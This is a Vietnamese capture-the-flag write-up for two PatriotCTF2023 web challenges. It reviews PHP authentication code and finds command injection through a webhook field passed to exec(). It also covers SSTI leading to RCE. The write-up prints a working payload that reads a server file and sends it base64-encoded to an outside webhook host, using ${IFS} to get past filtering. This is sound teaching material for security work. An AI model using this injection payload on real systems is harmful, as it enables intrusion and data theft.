## **Flower shop - PatriotCTF2023**

### **Tìm hiểu chức năng trang web và review source code**


- Ở trang web này, chúng ta sẽ tìm hiểu kĩ chức năng đăng nhập, đăng kí, reset mật khẩu. Và quan sát nó được code như thế nào.

![](./img_patriot/Screenshot%202023-09-12%20192723.png)

- Chúng ta sẽ đi tìm hiểu về chức năng đăng nhập

```php
`<?php
//Đoạn code sau được code theo lập trình hướng đối tượng
if (isset($_POST["submit"])) {
    $uid = $_POST["uid"];
    $pwd = $_POST["pwd"];

    
    include "../classes/dbh.php";
    include "../classes/login.class.php";

    $login = new LoginController($uid, $pwd);//Tạo đối tượng login

    $login->loginUser();// Kiểm tra xem có đăng nhập thành công hay không

    header("location: ../home.php");
}

?>

<?php

class Login extends Dbh {

    protected function getUser($uid, $pwd) { // Kiểm tra người dùng đăng nhập thành công hay không

        $stmt = $this->connect()->prepare('SELECT * FROM users WHERE username = :username');
        $stmt->bindValue(':username', $uid);
        
        if (!$stmt->execute()) {
            $stmt = null;
            header("location: ../login.php?error=stmtfaild");
            exit();
        }

        $user = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if ($user == false) {
            $stmt = null;
            header("location: ../login.php?error=UserNotFound");
            exit();
        }

        $pwdHashed = $user[0]["password"]; 
        $checkPwd = password_verify($pwd, $pwdHashed);// Kiểm tra password nhập vào và password được hash trong database

        if ($checkPwd == false) { 
            $stmt = null;
            header("location: ../login.php?error=WrongPassword");
            exit();
        } else { 
            if (isset($user[0]["tmp_pass_time"])) {
                $currTime = time();
                $tempTime = $user[0]["tmp_pass_time"];
                $delta = $currTime - $tempTime;
                
                if ($delta > 3600) {
                    header("location: ../login.php?error=TempPassExpired");
                    exit();
                } else {
                    $stmt = $this->connect()->prepare('UPDATE users SET tmp_pass_time = NULL WHERE username = :username');
                    $stmt->bindValue(':username', $uid);
                    
                    if (!$stmt->execute()) {
                        $stmt = null;
                        header("location: ../login.php?error=stmtfaild");
                        exit();
                    }
                }
            }
            
            session_start();
            $_SESSION["userid"] = $user[0]["user_id"];
            $_SESSION["username"] = $user[0]["username"];
            
            $stmt = null;
        }        
    }
}

class LoginController extends Login {

    private $uid;
    private $pwd;

    public function __construct($uid, $pwd) {
        $this->uid = $uid;
        $this->pwd = $pwd;
    }

    public function loginUser() {
        if (empty($this->uid)) {
            header("location: ../login.php?error=EmptyInput");
            exit();
        }

        $this->getUser($this->uid, $this->pwd);
    }
}
?>

```

- Chúng ta sẽ đi kiểm tra chức năng đăng kí

```php
<?php

if (isset($_POST["submit"])) {
    $uid = $_POST["uid"];
    $pwd = $_POST["pwd"];
    $wh = $_POST["wh"];

    include "../classes/dbh.php";
    include "../classes/signup.class.php";
    include "../classes/login.class.php";

    $signup = new SignupController($uid, $pwd, $wh);

    $signup->signupUser();// Thực hiện chức năng đăng kí

    $login = new LoginController($uid, $pwd);

    $login->loginUser();// Sau khi đăng kí thành công sẽ tự động đăng nhập luôn

    header("location: ../home.php");
}

?>

<?php

class Signup extends Dbh {

    protected function checkUser($uid) {// Kiểm tra xem username đã tồn tại hay chưa
        $stmt = $this->connect()->prepare('SELECT COUNT(*) FROM users where username = :username');
        $stmt->bindValue(':username', $uid);
        if (!$stmt->execute()) {
            $stmt = null;
            header("location: ../login.php?error=stmtfaild");
            exit();
        }
        
        if ($stmt->fetchColumn() > 0) {
            return false;
        } else {
            return true;
        }
    }

    protected function setUser($uid, $pwd, $wh) {
        $stmt = $this->connect()->prepare('INSERT INTO users (username, password, webhook) VALUES (:username, :password, :webhook)');
        // Thực hiện password_hash và lưu tk mk đăng kí cho người dùng
        $hashedPwd = password_hash($pwd, PASSWORD_DEFAULT);
        $stmt->bindValue(':username', $uid);
        $stmt->bindValue(':password', $hashedPwd);
        $stmt->bindValue(':webhook', $wh);
        
        if (!$stmt->execute()) {
            $errorInfo = $stmt->errorInfo();
            $stmt = null;
            header("location: ../login.php?error=" . $errorInfo[2]);
            exit();
        }

        $stmt = null;
    }

}

class SignupController extends Signup {

    private $uid;
    private $pwd;
    private $wh;

    public function __construct($uid, $pwd, $wh) {
        $this->uid = htmlspecialchars($uid);// thực hiện escape đầu vào
        $this->pwd = $pwd;
        $this->wh = filter_var($wh, FILTER_SANITIZE_URL);// Thực hiện fillter ví dụ: http://google.com sss sss   sẽ được fillter thành http://google.comssssss
    }

    public function signupUser() {
        if (empty($this->uid) || empty($this->pwd) || empty($this->wh)) {
            header("location: ../login.php?error=EmptyInput");
            exit();
        }

        if (preg_match("/^[a-zA-Z0-9]*%/", $this->uid)) {
            header("location: ../login.php?error=InvalidUid");
            exit();
        }

        if (!filter_var($this->wh, FILTER_VALIDATE_URL)) { // để bypass fillter này chúng ta phải nhập bắt đầu là 1 url
            header("location: ../login.php?error=NotValidWebhook");
            exit();
        }

        if (!$this->checkUser($this->uid)) {// Thực hiện kiểm tra đã tồn tại user hay chưa
            header("location: ../login.php?error=UserTaken");
            exit();
        }

        $this->setUser($this->uid, $this->pwd, $this->wh);// Thực hiện set user

    }

}


?>
```

- Chúng ta sẽ đi kiểm tra chức năng resetpassword

```php
<?php

include "../modules/helpers.php";

class Reset extends Dbh
{

    protected function checkUser($uid)
    {
        if (empty($uid)) {
            header("location: ../login.php?error=EmptyUser");
            exit();
        }

        $stmt = $this->connect()->prepare('SELECT * FROM users where username = :username');
        $stmt->bindValue(':username', $uid);


        if (!$stmt->execute()) {
            $stmt = null;
            header("location: ../login.php?error=stmtfaild");
            exit();
        }

        $user = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if ($user == false) {
            $stmt = null;
            header("location: ../login.php?error=UserNotFound");
            exit();
        }

        $wh = $user[0]["webhook"];
        return $wh;

    }

    protected function tmpPwd($uid)
    {
        $tmpPass = genTmpPwd();
        $tmpHash = password_hash($tmpPass, PASSWORD_DEFAULT);

        $stmt = $this->connect()->prepare('UPDATE users SET password = :password, tmp_pass_time = :tmp_pass_time WHERE username = :username');
        $stmt->bindValue(':username', $uid);
        $stmt->bindValue(':password', $tmpHash);
        $stmt->bindValue(':tmp_pass_time', time());

        if (!$stmt->execute()) {
            $errorInfo = $stmt->errorInfo();
            $errorMessage = $errorInfo[2];
            $stmt = null;
            header("location: ../login.php?error=" . $errorMessage);
            exit();
        }

        $stmt = null;
        return $tmpPass;
    }

}


class ResetController extends Reset
{

    private $uid;
    private $wh;
    private $tmpPass;

    public function __construct($uid)
    {
        $this->uid = $uid;
    }

    public function resetPassword()
    {
        $this->wh = $this->checkUser($this->uid);
        if (!$this->wh) {
            header("location: ../login.php?error=InvalidUser");
            exit();
        }

        $this->tmpPass = $this->tmpPwd($this->uid);

        exec("php ../scripts/send_pass.php " . $this->tmpPass . " " . $this->wh . " > /dev/null 2>&1 &");// Đây là đoạn code chúng ta để ý có khả năng để khai thác. Việc khai thác ở đây nguyên nhân có sự nối chuỗi và được thực hiện trong hàm exe từ đấy chúng ta có injection vào và thực hiện được command. Ở đây hàm đã nhận 2 đối số tmpPass chứa mật khẩu mới và wh chứa đường link webhook khi mình đăng kí

        return $this->tmpPass;
    }

}

?>
```

- Vậy để khai thác thành công chúng ta sẽ cần injection vào webhook để có thể thực hiện command. Và điều chúng ta lưu ý ở đây là bypass các hàm fillter. Như tôi đã giải thích ở trên hàm fillter thứ nhất sẽ loại bỏ các khoảng trắng việc này sẽ làm không thực hiện command thành công. Từ đấy, tôi bypass bằng biến ${IFS} sẽ có tác dụng coi như khoảng trắng khi thực thi lệnh. 

- POC khai thác như sau:
    - Bước 1: đăng kí với webhook -> https://webhook.site/bb21ee7d-0897-479a-8b03-5156e384f54e?c=$(cat${IFS}../admin.php|base64${IFS}-w0)
    - Bước 2: Thực hiện reset chúng ta sẽ đọc được file admin để đọc được flag.

![](./img_patriot/Screenshot%202023-09-13%20111813.png)

![](./img_patriot/Screenshot%202023-09-13%20112047.png)


## **Pick Your Starter**

- Ở trang web này không có chức năng nào quan trọng việc ấy khiên tôi khá bí ý tưởng. Tôi đã sử dụng tool dirsearch để xem có thư mục nào của trang web khiến tôi có thể khai thác không.

![](./img_patriot/Screenshot%202023-09-13%20014416.png)

- Có khá nhiều trang có status 200 tôi sẽ đi kiểm tra từng trang web. 

![](./img_patriot/Screenshot%202023-09-13%20020645.png)

![](./img_patriot/Screenshot%202023-09-13%20020727.png)

- Điều đặc biệt ở đây các đường dẫn ở đây đều có trong response. Theo suy nghĩ của tôi khả năng nó sẽ tồn tại lỗ hổng SSTI. 

- Tôi đã liền thử {{7*7}} vào đường đẫn url và kết quả phản hồi là 49 điều đấy có nghĩa nó đã thành công trong việc tấn công. Và giờ tôi chỉ cần tấn công với payload như sau để khai thác:

![](./img_patriot/Screenshot%202023-09-13%20114448.png)

- Và thực hiện RCE thành công để lấy flag.

![](./img_patriot/Screenshot%202023-09-13%20114618.png)